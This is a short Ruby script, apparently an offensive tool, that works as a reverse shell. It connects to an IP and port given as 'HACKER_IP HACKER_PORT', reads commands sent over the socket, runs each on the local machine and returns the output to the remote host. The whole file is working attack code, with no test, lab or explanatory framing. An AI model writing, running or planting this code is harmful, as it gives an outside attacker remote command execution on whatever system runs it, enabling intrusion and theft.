require 'socket'


if ARGV[0].nil? || ARGV[1].nil?
  puts "ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\n\n"
  exit
end

ip,port = ARGV
s = TCPSocket.new(ip,port)
while cmd = s.gets
  IO.popen(cmd,"r"){|io|s.print io.read}
end
